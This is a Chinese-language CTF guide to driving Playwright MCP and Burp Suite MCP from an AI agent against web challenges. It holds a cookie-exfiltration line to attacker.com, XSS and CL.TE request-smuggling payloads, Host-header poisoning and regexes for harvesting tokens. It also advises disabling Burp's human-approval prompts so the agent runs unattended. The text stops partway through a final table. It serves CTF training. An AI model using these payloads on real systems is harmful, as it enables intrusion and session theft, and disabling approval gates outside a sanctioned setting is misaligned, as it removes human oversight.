# CTF Web - MCP 服务器集成

Web 挑战中真正重要的 MCP 服务器有两个，而且它们从相反的方向发起攻击：

- **Playwright MCP** 让 agent 驱动真实的浏览器（Chromium/Firefox/WebKit）——
  适用于*浏览器*本身就是漏洞组成部分的场景（DOM XSS、admin bot 模拟、SPA 客户端密钥、
  多步认证流程）。
- **Burp Suite MCP** 把一个运行中的 Burp 暴露给 agent —— 适用于*线路层*
  （header 级别的 HTTP/1.1 与 HTTP/2 控制、请求走私、通过 Collaborator 的带外回调、
  挖掘代理中已经捕获的流量）。

两者可以配对，而配对只需要一个参数：用
`--proxy-server http://127.0.0.1:8080 --ignore-https-errors` 启动 Playwright MCP，
在该浏览器里浏览应用，然后从 Burp 的代理历史里挖掘 JavaScript 实际调用过的 API 面。
不加上代理参数，两个服务器就永远看不到对方的流量。

## 目录
- [Playwright MCP（浏览器自动化）](#playwright-mcp浏览器自动化)
  - [初始化](#初始化)
  - [核心工具](#核心工具)
  - [复现 Admin Bot（DOM XSS）](#复现-admin-botdom-xss)
  - [DOM、控制台与网络检查](#dom控制台与网络检查)
  - [认证流程与文件上传](#认证流程与文件上传)
  - [何时用 Playwright MCP，何时用 curl](#何时用-playwright-mcp何时用-curl)
- [Burp Suite MCP（线路层利用）](#burp-suite-mcp线路层利用)
  - [初始化](#setup-1)
  - [先解除 Agent 的阻塞（审批门）](#先解除-agent-的阻塞审批门)
  - [核心工具（完整签名）](#核心工具完整签名)
  - [目标三元组：Host 头解耦](#目标三元组host-头解耦)
  - [原始请求：HTTP/1.1 与线路上的幸存情况](#原始请求http11-与线路上的幸存情况)
  - [HTTP/2：基于 Map，以及它的限制](#http2基于-map以及它的限制)
  - [Repeater 与 Intruder：只能暂存，拿不到结果](#repeater-与-intruder只能暂存拿不到结果)
  - [挖掘代理历史](#挖掘代理历史)
  - [Collaborator：盲 SSRF / XXE / OOB](#collaborator盲-ssrf--xxe--oob)
  - [扫描器、编码与实用工具](#扫描器编码与实用工具)
  - [快速路径：从零到 flag](#快速路径从零到-flag)
- [何时用 Burp MCP、curl 还是 Playwright MCP](#何时用-burp-mcpcurl-还是-playwright-mcp)

---

<a id="playwright-mcp-browser-automation"></a>
## Playwright MCP（浏览器自动化）

很多 Web 挑战需要*真实浏览器*：只有 JS 执行后才会触发的 DOM XSS、admin bot 模拟、
客户端加密、SPA 状态，或者登录之后的多步流程。**Playwright MCP** 通过结构化
无障碍快照（无需截图/视觉识别）让 agent 驱动真实的 Chromium/Firefox/WebKit 浏览器，
因此 agent 可以导航、点击、输入、检查 DOM、读取控制台并观察网络流量。

<a id="setup"></a>
### 初始化

仓库：`https://github.com/microsoft/playwright-mcp`（Apache-2.0，微软官方，已测试 v0.0.78+）。

```bash
# 启动 MCP 服务器（需要 Node.js）；多数客户端会自动管理：
npx @playwright/mcp@latest

# 需要可见页面的 admin-bot 类挑战，使用有头浏览器：
npx @playwright/mcp@latest --headless=false

# 浏览器二进制是独立下载的 —— 没有它每次工具调用都会报
# 'Browser "chrome-for-testing" is not installed'：
npx @playwright/mcp@latest install-browser chrome-for-testing
```

<a id="core-tools"></a>
### 核心工具

- 导航：`browser_navigate`、`browser_navigate_back`、`browser_tabs`
- 读取状态：`browser_snapshot`（无障碍树 —— 主要的"看页面"工具；
  `depth` 裁剪、`target` 限定范围、`filename` 落盘），
  `browser_find`（**在**快照上做正则/文本搜索 —— 只需要一个元素或一个值时开销小得多）、
  `browser_take_screenshot`、
  `browser_console_messages`、`browser_network_requests` → `browser_network_request`
- 交互：`browser_click`、`browser_type`、`browser_fill_form`、`browser_press_key`、
  `browser_select_option`、`browser_hover`、`browser_drag`、`browser_drop`、
  `browser_file_upload`、`browser_handle_dialog`、`browser_resize`
- 脚本：`browser_evaluate`（页面上下文中的 JS；`filename` 落盘大输出）、
  `browser_wait_for`、`browser_run_code_unsafe`（对 `page` 对象执行任意 Playwright
  代码 —— `page.route` 拦截、多页面流程、原始 `page.request`；等价于 RCE，
  所以只在结构化工具无法表达该步骤时才用）

**网络需要两个工具，不是一个。** `browser_network_requests` *只*返回
`[METHOD] url => [status]` 的编号列表 —— **没有 header，也没有 body**。
token、session ID 和 flag 都在 body 里，必须按请求逐个获取：

```text
browser_network_requests static=false filter="/api/"   # 先缩小列表
browser_network_request index=2 part="response-body"   # ← 真正的 payload
# part = request-headers | request-body | response-headers | response-body
```

端到端已验证：一个 `fetch('/api/token')` 返回
`{"status":"ok","token":"flag{...}"}`，在 `browser_network_requests` 里只显示为
`[GET] /api/token => [200] OK`；只有
`browser_network_request part="response-body"` 才能拿到 flag。

**会掩盖证据的默认值：**

- `browser_network_requests` 必须显式给 `static`；`static=false` 会省略
  图片/字体/脚本（通常是你要的，但要显式写明）。
- `browser_console_messages` 默认 `all=false` —— **只包含上次导航之后的消息**。
  初始页面加载时打印的 flag 会在再次导航后消失。排查时传 `all=true`。
  `level` 默认为 `info`（每个级别都包含更严重的级别）。

**产物会落到磁盘，也就是你的工作目录。** 快照、控制台日志，
以及服务器未以纯文本发送的响应 body 都会写入进程 CWD 下的
`.playwright-mcp/`，并以*路径*而非内联内容返回 —— 需要读文件才能看到。
把 `.playwright-mcp/` 加到 `.gitignore`，以免浏览器驱动的挑战产物被提交。

**关键要点：** `browser_snapshot` 返回带稳定元素 ref 的结构化无障碍树 ——
判断该点/该输入什么时优先用它而不是截图。当你已经知道要找什么时，
`browser_find` 优于完整快照：它只返回匹配节点加少量上下文，token 消耗少得多。

<a id="reproducing-the-admin-bot-dom-xss"></a>
### 复现 Admin Bot（DOM XSS）

很多 XSS 挑战带一个"admin bot"，它会用存放 flag 的 cookie 访问你的 URL。
没有提供 bot 时（或者要在本地测试时），Playwright MCP *就是*你的 bot：
以脚本化受害者的身份导航到 payload URL 并观察结果。

```text
browser_navigate "https://chall.example.com/?q=<img src=x onerror=...>"
browser_console_messages        # payload 执行了吗？读控制台输出
browser_network_requests        # 有没有外带到你的监听器？
```

要端到端验证窃取 cookie 的 payload，先设置一个测试 flag cookie，
然后确认能外带到你自己控制的占位收集器：

```javascript
// browser_evaluate — 模拟受害者持有 flag，然后验证外带
// 真实挑战的 cookie 是 HttpOnly；这里只能模拟非 HttpOnly 的情况。
document.cookie = "flag=flag{test}; path=/";
new Image().src = "https://attacker.com/c?" + document.cookie;
```

**关键要点：** Playwright MCP 让 agent *成为* admin bot —— 它像受害者浏览器那样
执行页面 JS，因此纯 DOM 型 XSS、框架 gadget（Angular/Vue 沙箱逃逸），
以及从未出现在原始 HTML 里的 mutation XSS 都变得可观测。可配合
[client-side.md](client-side.md) 和 [client-side-advanced.md](client-side-advanced.md) 中的 payload。

<a id="dom-console--network-inspection"></a>
### DOM、控制台与网络检查

```text
browser_navigate "https://chall.example.com/app"
browser_find text="flag"        # 渲染页面上最便宜的第一轮搜索
browser_snapshot depth=6        # 无障碍树：隐藏输入框、role、ref
browser_evaluate "() => window.__APP_STATE__"   # dump SPA 状态 / 客户端密钥
browser_evaluate "() => [...document.scripts].map(s => s.src)"  # 枚举 JS bundle
browser_network_requests static=false           # 发现端点……
browser_network_request index=<n> part="response-body"   # ……再读 payload
browser_console_messages level="info" all=true  # source map、调试泄漏、堆栈
```

客户端挑战经常把答案藏在 JS 里：客户端 HMAC 密钥、被禁用的按钮、
在内存中拼装的 flag。`browser_evaluate` 能读取从未出现在所服务 HTML 中的实时 JS 值 ——
已验证：只存在于 `window.__APP_STATE__` 里的密钥一次调用就能取回。

**关键要点：** 网络这对工具揭示真正的 API 面（XHR/fetch 端点、bearer token、
WebSocket URL），而静态 `curl` HTML 会漏掉它们，因为 JavaScript 在加载后才发出这些请求 ——
但发现与取 payload 是**两次独立调用**。列出请求只说明端点存在；
只有 `browser_network_request part="response-body"` 才告诉你它返回了什么。
停在列表这一步，是错过 flag 最常见的方式。

<a id="authenticated-flows--file-upload"></a>
### 认证流程与文件上传

```text
browser_navigate "https://chall.example.com/login"
browser_fill_form               # 用户名/密码字段（ref 来自快照）
browser_click <login button ref>
browser_wait_for "Dashboard"    # 等待登录后状态
# 会话 cookie 现在保存在浏览器上下文中，供后续请求使用
browser_file_upload "/tmp/shell.png"   # 在浏览器中驱动上传到 RCE 的流程
```

**关键要点：** Playwright 在各次工具调用之间保持浏览器上下文（cookie、localStorage），
所以多步认证挑战 —— 登录、进入受保护功能、触发 bug —— 无需手工重放会话头即可完成。
这是浏览器侧的补充，与
[auth-and-access.md](auth-and-access.md) 中伪造 header/cookie 的做法相对。

<a id="when-to-use-playwright-mcp-vs-curl"></a>
### 何时用 Playwright MCP，何时用 curl

| 场景 | 使用 |
|-----------|-----|
| 漏洞需要 JavaScript 执行（DOM XSS、SPA、客户端加密） | Playwright MCP |
| 模拟 admin bot / 受害者浏览器 | Playwright MCP |
| 读取 JS 发出的 API 调用、实时 DOM 或客户端密钥 | Playwright MCP |
| 多步认证 UI 流程 | Playwright MCP |
| 原始请求走私、header 注入、字节级 payload | Burp MCP（下文）/ `curl` |
| 抓取全部流量供后续正则挖掘 | Playwright MCP **经** Burp（`--proxy-server`） |
| 快速模糊测试 / 爆破 | `ffuf` / `requests` —— 更快，无浏览器开销 |

**关键要点：** 当*浏览器*是漏洞的一部分（客户端执行、受害者模拟）时用 Playwright MCP。
对于需要精确控制线路上字节的服务端漏洞，下文 Burp MCP 一节（或 `curl`/`requests`）
才是正确工具 —— 浏览器会以各种方式规范化并重新编码请求，
从而破坏走私与注入 payload。

---

<a id="burp-suite-mcp-wire-level-exploitation"></a>
## Burp Suite MCP（线路层利用）

有些 Web 挑战是在线路上赢下的：字节精确的请求、HTTP/2 走私、
用于盲 SSRF/XXE 的带外（OOB）回调，或者把同一个请求改一个字节重放一千次。
**Burp Suite 官方 MCP Server**
（[PortSwigger/mcp-server](https://github.com/PortSwigger/mcp-server)）把一个运行中的
Burp Suite（Community 或 Pro）暴露给 agent：通过 Burp 引擎发送原始 HTTP/1.1 与 HTTP/2
请求、驱动 Repeater 和 Intruder、挖掘浏览器驱动应用时捕获的代理历史，
并从 Burp Collaborator 取 OOB 交互数据 —— 全程不离开 agent 循环。

Burp MCP 是上文 Playwright *浏览器级*自动化的*线路层*补充。两者配合良好：
在经 Burp 代理的 Playwright 浏览器里浏览应用，然后从 `get_proxy_http_history`
挖掘 JS 实际调用过的 API 面。

<a id="setup-1"></a>
### 初始化

仓库：`https://github.com/PortSwigger/mcp-server`（PortSwigger 官方，
以 Burp 扩展 jar 分发；BApp Store 中名为 "MCP Server"）。

Burp Pro/Community 必须已启动并加载该扩展 —— MCP 服务器*运行在* Burp 内部，
所以**在 Burp 起来之前什么都用不了**。如果 agent 在 Burp 未启动时启动，
客户端会把服务器标记为失败，`mcp__burp__*` 工具永远不出现；
先启动 Burp，再启动（或重启）agent。

```bash
# 1. 构建扩展 jar（需要 JDK 17+；proxy jar 随 libs/ 提供）：
git clone https://github.com/PortSwigger/mcp-server.git
cd mcp-server && ./gradlew embedProxyJar    # -> build/libs/burp-mcp-all.jar

# 2. 启动 Burp Suite，然后加载 jar：
#    Extensions -> Installed -> Add -> Type: Java -> 选择 burp-mcp-all.jar
#    会出现 "MCP" 标签页；确认服务器为 Enabled（默认 127.0.0.1:9876）。
#    勾选 'Automatically reload extensions on startup'，使其在重启后仍生效。

# 3. 注册到 agent。SSE 端点是基础 URL（根路径），
#    不是 /sse —— 当前构建上 GET /sse 返回 404：
claude mcp add --transport sse burp http://127.0.0.1:9876
```

只支持 stdio 的客户端可以改用自带的 proxy，而不是 SSE：

```bash
java -jar /path/to/mcp-proxy-all.jar --sse-url http://127.0.0.1:9876
```

不使用 agent 也能验证 —— 握手是纯 SSE + JSON-RPC：

```bash
curl -s -i http://127.0.0.1:9876/sse | head -1   # HTTP/1.1 404 Not Found  <- 路径错误
curl -sN http://127.0.0.1:9876/       | head -2   # event: endpoint
                                                  # data: ?sessionId=<uuid>
# 然后 POST {"jsonrpc":"2.0","id":1,"method":"tools/list"} 到 /?sessionId=<uuid>
```

**关键要点：** 文档里写的 `http://127.0.0.1:9876/sse` 在当前构建上返回 404 ——
SSE 流由基础 URL `/` 提供。如果客户端报告"连接失败"，
先去去掉 `/sse` 后缀，再去排查其他东西。

<a id="unblock-the-agent-first-approval-gates"></a>
### 先解除 Agent 的阻塞（审批门）

**这决定了 Burp MCP 是有用的工具，还是把 agent 挂死。** 默认情况下
`requireHttpRequestApproval` 和 `requireDataAccessApproval` 都是**开启**的，
所以第一次 `send_http1_request` 或 `get_proxy_http_history` 会在
*Burp 内部*弹出 Swing 模态对话框，工具调用一直阻塞到有人点击。已验证：
这次调用不只是返回慢 —— JSON-RPC POST 本身永远拿不到响应，Burp 的 EDT 被阻塞，
其他所有涉及 UI 的工具都排在它后面挂起。无人值守的 agent 会卡在第一个请求上。

开始工作前，在 Burp 的 **MCP** 标签页中：

| 设置 | 默认 | CTF 中应设为 | 原因 |
|---------|---------|-------------|-----|
| `Require approval for HTTP requests` | 开 | **关**（或添加自动批准目标） | 否则每个新主机都会阻塞在对话框上 |
| `Require approval for project data access` | 开 | **关**（或勾选三项 `Always allow …`） | 控制 HTTP 历史、WebSocket 历史、Organizer |
| `Enable tools that can edit your config` | **关** | 需要 `set_user_options` 时开启 | 不开时这些工具只返回拒绝字符串 |

盯着屏幕操作时保持审批开启也没问题：对话框提供
`Allow Once` / `Always Allow Host` / `Always Allow Host:Port` / `Deny`，
其中"always"选项会写入自动批准列表。自动批准条目接受
`host`、`host:port` 和 `*.domain` 通配符，所以 `*.ctf.example.com`
一条就能覆盖整场比赛。

关闭配置编辑时，`set_user_options` / `set_project_options` 返回：
`User has disabled configuration editing. They can enable it in the MCP tab…`
—— 已实测，很容易误判为 bug。

**关键要点：** MCP 设置保存在扩展的**项目**数据中，而不是用户偏好设置 ——
临时项目每次启动都会重置所有勾选项。为比赛打开一个*已保存*的项目文件，
勾选一次，agent 就能在余下赛程中无人值守运行。

<a id="core-tools-full-signatures"></a>
### 核心工具（完整签名）

27 个工具，全部带 `mcp__burp__` 前缀（已对照 `burp-suite` v1.1.2 验证）。
**必填参数没有默认值** —— 省略 `count`/`offset` 会直接失败并报
`Fields [count, offset] are required…`，而每个发请求的工具都需要完整的目标三元组：

```text
send_http1_request(content, targetHostname, targetPort, usesHttps)
send_http2_request(pseudoHeaders, headers, requestBody, targetHostname, targetPort, usesHttps)
create_repeater_tab(content, targetHostname, targetPort, usesHttps, tabName?)
create_repeater_tab_http2(pseudoHeaders, headers, requestBody, targetHostname, targetPort, usesHttps, tabName?)
send_to_intruder(content, targetHostname, targetPort, usesHttps, tabName?)

get_proxy_http_history(count, offset)
get_proxy_http_history_regex(regex, count, offset)
get_proxy_websocket_history(count, offset)
get_proxy_websocket_history_regex(regex, count, offset)
get_organizer_items(count, offset)
get_organizer_items_regex(regex, count, offset)
get_scanner_issues(count, offset)                    # 仅 Pro

generate_collaborator_payload(customData?)           # 仅 Pro
get_collaborator_interactions(payloadId?)            # 仅 Pro

url_encode(content)      url_decode(content)
base64_encode(content)   base64_decode(content)
generate_random_string(length, characterSet)

output_user_options()    output_project_options()
set_user_options(json)   set_project_options(json)    # 受门控，见上文
set_proxy_intercept_state(intercepting)
set_task_execution_engine_state(running)
get_active_editor_contents()  set_active_editor_contents(text)
```

**Community 版没有 Collaborator，也没有扫描器。** 那三个工具只在版本为
`PROFESSIONAL` 时注册 —— 在 Community 上它们完全不出现在 `tools/list` 中，
所以围绕 Collaborator 设计的盲 SSRF 方案，动手前就得准备替代监听器
（`interactsh`，或者你自己的 DNS/HTTP 机器）。

分页工具在 `offset` 越过最后一项后返回字面字符串 `Reached end of items` ——
循环的终止条件是这条哨兵值，而不是空结果。每项都是 JSON，且
**单项超过 5000 字符会被截断**并追加 `... (truncated)`。深埋在大响应 body 里的
flag 会被切掉：用 `_regex` 变体缩小范围，或者用 `send_http1_request`
重发请求以获取未截断的响应。

<a id="the-target-triple-host-header-decoupling"></a>
### 目标三元组：Host 头解耦

`targetHostname` / `targetPort` / `usesHttps` 决定**TCP 连接发往哪里**。
系统不会从 `content` 里解析 URL，因此请求中的 `Host:` 头与 socket 目的地
完全独立。这种解耦是整整一类漏洞的免费原语 —— 而且在这里比用 `curl`
*更容易*，后者需要 `--resolve` 之类的技巧：

```text
# Host header 注入 / 密码重置投毒 / 缓存投毒：
targetHostname=chall.example.com  targetPort=443  usesHttps=true
content:  GET /reset HTTP/1.1
          Host: attacker.example.net

# 针对某个 IP 做虚拟主机爆破，寻找内部 vhost：
targetHostname=10.0.0.5  targetPort=80  usesHttps=false
content:  GET / HTTP/1.1
          Host: admin.internal
```

**关键要点：** 三元组也是陷阱。`usesHttps=true` 配
`targetPort=80`（或反过来）会在 TLS 层以令人困惑的错误失败，
而从上一个请求抄来的过期 `Host` 会静默把你路由到错误的 vhost。
当响应说不通时，先复核三元组，再检查 payload。

<a id="raw-requests-http11--what-survives-the-wire"></a>
### 原始请求：HTTP/1.1 与线路上的幸存情况

`send_http1_request` 比 `curl` 更贴近线路 —— 但它**不是字节精确**的，
而确切了解它在哪里改写，决定了走私挑战能否通过 MCP 解决。

扩展会对每个请求执行 `normalizeHttpContent`。它在第一个空行处切分，
并对两半做不同处理：

| 区域 | 处理方式 |
|--------|-----------|
| **前导**（请求行 + header） | 重写：字面 `\r\n` → 真实 CRLF，字面 `\n` → CRLF，**裸 LF → CRLF**，**孤立 CR 被剥离** |
| **Body**（第一个空行之后） | **原样** —— 真实 LF、字面 `\n`、二进制字节全部原封不动通过 |

这个重写之所以存在，是因为 MCP 客户端经常在 JSON 字符串参数里输出
`\`,`r`,`\`,`n` 四个字符而不是真实 CR+LF，严格服务器会以 `400` 拒绝。
这是一个可用性修补，代价是你失去了对 header 的字节控制：

| 走私 / 注入技巧 | 能否通过 `send_http1_request`？ |
|------------------------------|-------------------------------|
| chunk 大小游戏、终止 `0\r\n\r\n`、被走私的请求本身（全在 **body** 里） | **能** —— body 原样传输 |
| 重复的 `Content-Length` / `Transfer-Encoding` 头 | **能** |
| Obs-fold 续行（`\r\n\tchunked`） | **能** —— tab/空格保留，CRLF 会被重新插入 |
| 空格/tab 技巧（`Transfer-Encoding : chunked`、尾部空格） | **能** |
| header 值内的垂直 tab / 换页符 / NUL | **能** —— 只有 CR 和 LF 会被改动 |
| **裸 LF header 终结符**（`Transfer-Encoding: chunked\nX: y`） | **不能** —— 被规范化为 CRLF |
| **仅 CR 终结符**、`\r\rX:`、孤立 CR 失步 | **不能** —— CR 被剥离且*不*产生换行，两个 header **合并成一个损坏的值** |
| 省略最后空行以阻塞解析器 | **不可靠** —— `normalizeHttpContent` 会保留缺失状态（整个输入被当作前导），但 Burp 的请求构造器在序列化时可能补上终结符 |

```text
send_http1_request
  targetHostname=chall.example.com  targetPort=443  usesHttps=true
  content:
    POST /login HTTP/1.1
    Host: chall.example.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 34
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    X-Ignore: X
```

在另一端抓取原始 socket 后确认了两个行为，走私流程都依赖它们：

- **`Content-Length` 从不重算。** `Content-Length: 999` 配 5 字节 body
  到达时仍是 `Content-Length: 999` + `AAAAA`。刻意制造的长度/body 不匹配 ——
  CL 失步的全部基础 —— 原样通过。
- **header 顺序与大小写保持不变。** `X-Case-SeNsItIvE` 到达时大小写完好，
  重复的 `Content-Length: 5` / `Content-Length: 6` 都按给定顺序落地。

**关键要点：** 经典的 CL.TE / TE.CL 失步可以正常工作，因为技巧存在于 **body**
里，而且长度从不会被自动修正。*不能*工作的是任何依赖裸 LF 或孤立 CR 作为
**header** 终结符的失步 —— 这一类会被整体规范化掉，而孤立 CR 的情形会
*静默地合并 header 而失败*（`Transfer-Encoding: chunked\rX-Smuggled: yes`
实际发出为 `Transfer-Encoding: chunkedX-Smuggled: yes`），于是你得到 200 而不是错误，
也就没有失步。当某个 header 级技巧表现得像消失了，那它确实消失了：
这类场景改用原始 socket（`socket`/`openssl s_client`/`pwntools`），
其余场景继续用 Burp MCP。

<a id="http2-map-based-and-its-limits"></a>
### HTTP/2：基于 Map，以及它的限制

`send_http2_request` **不是**原始字节工具。它接收两个 JSON 对象和一个 body，
替你把帧构造出来：

```text
send_http2_request
  targetHostname=chall.example.com  targetPort=443  usesHttps=true
  pseudoHeaders: {"method":"POST","path":"/admin","scheme":"https","authority":"chall.example.com"}
  headers:       {"content-type":"application/json"}
  requestBody:   {"id":1}
```

伪头会自动加 `:` 前缀（传 `method` 或 `:method` 都行），
输出顺序为 `:scheme, :method, :path, :authority`；额外添加的键会追加在后面，
这正是**伪头注入**可达的原因。但由于两个参数都是键名小写的 map，有两件事不可能：

- **重复 header** —— JSON 对象无法容纳两个 `content-length`，
  所以 H2 重复头失步出局
- **大写 header 名** —— 键在组帧前被转小写，
  依赖大小写存活到后端的 H2 降级技巧被杀死

**关键要点：** 用 `send_http2_request` 做 H2.CL/H2.TE 走私（把冲突的
`content-length`/`transfer-encoding` 放进 `headers`，被走私请求放进 `requestBody`），
以及做 header 值内 CRLF 和伪头注入 —— 这些*确实*可达，而 `curl` 表达不了。
至于重复或大小写敏感的 H2 header，你需要原始 H2 客户端
（`h2spec`、`hyper-h2`、Burp 自带的 HTTP/2 模式 Repeater 加 inspector 编辑）。

<a id="repeater--intruder-staging-only-no-results"></a>
### Repeater 与 Intruder：只能暂存，拿不到结果

在围绕 Intruder 规划任何爆破之前先读这段：**`send_to_intruder`
和 `create_repeater_tab` 只是*暂存*请求。** 它们返回 `Executed tool`，仅此而已。
**没有任何 MCP 工具能启动 Intruder 攻击、设置 payload 位置或读取攻击结果**，
也没有工具能读取 Repeater 响应。必须有真人在 Burp UI 里点击才会发生任何事。

```text
create_repeater_tab       # 把请求停在一个标签页里，供人手工迭代
send_to_intruder          # 把请求停进 Intruder，供人配置
```

所以自动化模糊测试时，agent 实际上只有两个选择：

```bash
# 1. 自己循环 send_http1_request —— 每次调用都返回完整响应文本，
#    因此在 agent 循环里做 grep 提取。每个探针都需要线路控制时最合适。
# 2. 调外部 ffuf/requests —— 字典类工作快得多：
ffuf -u https://chall.example.com/FUZZ -w wordlist.txt -mc 200,302 -t 40
```

**关键要点：** 之前"Burp 引擎会替你处理并发和 grep 匹配提取"的假设
在 MCP 上并不成立 —— 那是 Intruder *GUI* 的特性，不是 MCP 接口的特性。
把 `send_to_intruder` 当作交给人类操作员的接力（当你想让对方接手一个
有希望的请求时很有用），自动化模糊测试则用 `ffuf` 或 `send_http1_request` 循环。

<a id="mining-proxy-history"></a>
### 挖掘代理历史

所有经过 Burp **代理**的流量都可查询 —— 而"经过代理"这个词是关键。
你用 `send_http1_request` 发出的请求走的是 Burp 的 HTTP 引擎，
*不是*代理监听器，所以**它们永远不会出现在代理历史里** ——
已实测：七次 `send_http1_request` 之后历史仍返回
`Reached end of items`，而一次 `curl -x http://127.0.0.1:8080` 立刻出现。
历史的丰富程度只取决于浏览器或客户端实际推过 8080 端口的流量。
先灌流量，再挖掘：

```bash
# Playwright MCP 走 Burp 代理 —— 正是这个配对让两者都有用：
npx @playwright/mcp@latest --proxy-server http://127.0.0.1:8080 --ignore-https-errors
# 其他客户端：按常规方式指向代理
curl -x http://127.0.0.1:8080 -k https://chall.example.com/
export HTTP_PROXY=http://127.0.0.1:8080 HTTPS_PROXY=http://127.0.0.1:8080
```

`--ignore-https-errors` 很关键：不安装 Burp 的 CA，每次 HTTPS 导航都会因证书错误
失败，历史始终为空。

然后开始挖掘 —— 记住 `count` 和 `offset` 是**必填**的：

```text
get_proxy_http_history         count=50 offset=0     # 遍历整个历史
get_proxy_http_history_regex   count=20 offset=0 regex="Authorization: Bearer [\w.-]+"
get_proxy_http_history_regex   count=20 offset=0 regex="/api/v[0-9]+/[a-z]+"
get_proxy_http_history_regex   count=20 offset=0 regex="flag\{|secret|api[_-]?key"
get_proxy_websocket_history_regex count=50 offset=0 regex="flag|secret|token"
```

每项返回为 `{"request":"…","response":"…","notes":"…"}`，两个字符串里含完整的
原始 header 与 body。正则是 **Java `Pattern`**，匹配整个序列化后的条目，
所以一个模式可同时扫 header、body 和 URL —— 已验证：对捕获流量使用
`(?i)flag\{` 会返回那个*响应 body* 含有 flag 的条目。
Java 正则意味着 `\w`、`(?i)`、lookahead 都可用；但它*不*意味着 PCRE 递归。
用 `offset += count` 翻页直到返回 `Reached end of items`，
并记住每项在 5000 字符处被截断。

**关键要点：** 正则变体把 Burp 历史变成可搜索语料 ——
无需重发任何一个请求，就能拉出应用发出的每个 bearer token、session cookie、
隐藏 API 路径、CSRF token 或 source map URL。这是 `browser_network_requests`
的线路层对应物，而且在这方面明显更强：一次调用即可跨所有流量 grep 请求*和*
响应 body，而 Playwright 需要每个端点一次 `browser_network_request` 调用，
且只能看到该页面发出的内容。任何捕获到的会话，第一件事就用 `(?i)flag\{` ——
这是最便宜的 flag 检查。

<a id="collaborator-blind-ssrf--xxe--oob"></a>
### Collaborator：盲 SSRF / XXE / OOB

盲打与带外漏洞（无回显的 SSRF、盲 XXE、通过 DNS/HTTP 外带的盲 SQLi、
反序列化回调）需要一个你控制的监听器。Burp Collaborator 就是那个监听器，
agent 可以端到端驱动它：

**仅 Pro** —— 这两个工具在 Community 上根本不注册。

```text
generate_collaborator_payload
# -> Payload: <31-char-subdomain>.oastify.com     （每次调用唯一）
#    Payload ID: <31-char-subdomain>
#    Collaborator server: oastify.com

# 把 payload 注入目标（SSRF url=、XXE SYSTEM、DNS 外带等）
send_http1_request ... http://<31-char-subdomain>.oastify.com/x ...

get_collaborator_interactions                    # 所有交互
get_collaborator_interactions payloadId="<31-char-subdomain>"
# -> "No interactions detected" 或每次命中一条 JSON（type、时间戳、client IP、协议数据）
```

工具列表几乎没有提示的两个参数，都值得使用：

- **`payloadId`** 把交互过滤到单个 payload。为每个注入点生成*独立*
  payload，然后逐个 ID 轮询 —— 命中直接告诉你**哪个**参数存在漏洞，
  无需第二轮测试。不加过滤会拿到所有交互，只能手工关联。
- **`customData`** 把标签烤进 payload 子域，让回调本身就能标识注入点。
  **硬限制：≤16 个字母数字字符** —— 已验证，`"sqli-param-id"` 因连字符被拒绝并报
  `Length of custom data must not exceed 16 alphanumeric characters`。
  使用短字母数字标签，如 `xxe1`、`hdr2`、`ssrfurl`。

Collaborator 能捕获 **DNS、HTTP 和 SMTP**。DNS 通道最重要：
即使所有出站 HTTP 被封它也能触发，而一个 Java/PHP 目标哪怕只是
*解析*了你的主机名，就已经证明了 SSRF。`No interactions detected`
在最初几秒内是正常的 —— 宣告 payload 无效前再轮询几次。

**关键要点：** `get_collaborator_interactions` 闭环了没有带内信号的漏洞 ——
如果 DNS 查询或 HTTP 回调落地，漏洞即确认，而交互的子域/路径/body 往往携带
外带数据（主机名、文件内容、逐字符的查询结果）。每个注入点一个 payload
加 `payloadId` 轮询，一次就能把"某个东西有漏洞"变成"*这个参数*有漏洞"。
配合 [server-side.md](server-side.md) 与
[server-side-2.md](server-side-2.md) 中的 SSRF 与 XXE 笔记。
在 Community 上，改用 `interactsh-client` 或你自己的 DNS/HTTP 监听器。

<a id="scanner-encoding--utilities"></a>
### 扫描器、编码与实用工具

```text
get_scanner_issues count=20 offset=0     # Pro：读取已存在的扫描问题
url_encode / url_decode                  # Burp 自带编码器，无需外部命令
base64_encode / base64_decode            # 解开 token、cookie、JWT 片段
generate_random_string                   # cache-buster / 唯一标记值
```

`get_scanner_issues` 是**只读的，且没有启动扫描的 MCP 工具。**
在全新项目上它返回 `Reached end of items`。实际出现的是 Burp 对已穿过代理流量的
*被动*发现，所以只有在你通过 8080 端口浏览过应用后才有用 ——
主动扫描仍需真人右键 → Scan。

`generate_random_string(length, characterSet)` —— **`characterSet` 是字面字母表，
不是枚举名。** 已验证：`characterSet="HEX"` 返回
`XHHEHXXXEEXEHHHXXHEX`（从字母 H、E、X 中抽取），而非十六进制数字。
传实际字符：`"0123456789abcdef"` → `f47a80c30a807ee9cdd6`。

`set_proxy_intercept_state(intercepting=false)` 值得**在会话开始时防御性调用**：
如果拦截被留着开启，每个经过代理的请求都会卡在 Intercept 标签页，
Playwright 和应用看起来都像挂了。`set_task_execution_engine_state(running=false)`
暂停 Burp 的后台任务 —— 在你手工操作时，可阻止爬取/扫描流量碰到脆弱或限流的挑战。

**关键要点：** 编码/解码辅助函数让 JWT、cookie 和 payload 变换留在 agent 循环内，
但不要高估扫描器 —— 通过 MCP 它只是被动发现的读取器，
不是"对准目标点一下"的按钮。真正的分诊来自代理历史正则挖掘
加定向的 `send_http1_request` 探针。

<a id="fast-path-zero-to-flag"></a>
### 快速路径：从零到 flag

安排好调用顺序，让每一步要么拿到 flag，要么缩小攻击面：

```text
1. set_proxy_intercept_state intercepting=false        # 清除残留拦截状态
2. 通过 Burp 浏览应用（Playwright MCP 加 --proxy-server，或 curl -x）
3. get_proxy_http_history_regex regex="(?i)flag\{"     # 免费的机会检查
4. get_proxy_http_history_regex regex="(?i)set-cookie|authorization|api[_-]?key|csrf"
5. get_proxy_http_history_regex regex="/api/|\.js(\?|$)|graphql"   # 测绘攻击面
6. 对有意思的端点用 send_http1_request —— payload、认证绕过、IDOR
7. 盲打/无回显漏洞？每个注入点 generate_collaborator_payload，
   注入，然后 get_collaborator_interactions payloadId=<id>
8. 需要量？用 ffuf 或 send_http1_request 循环 —— 不是 send_to_intruder
```

**关键要点：** 第 3–5 步是三次廉价调用，读取的是*你已经拥有的流量*，
经常直接交出 flag、session cookie，或者挑战所依赖的那个未公开端点 ——
在写第一个 payload 之前先做它们。昂贵而有创造性的工作（第 6 步起）
只应针对历史已经测绘好的攻击面执行。

---

<a id="when-to-use-burp-mcp-vs-curl-vs-playwright-mcp"></a>
## 何时用 Burp MCP、curl 还是 Playwright MCP

| 场景 | 使用 |
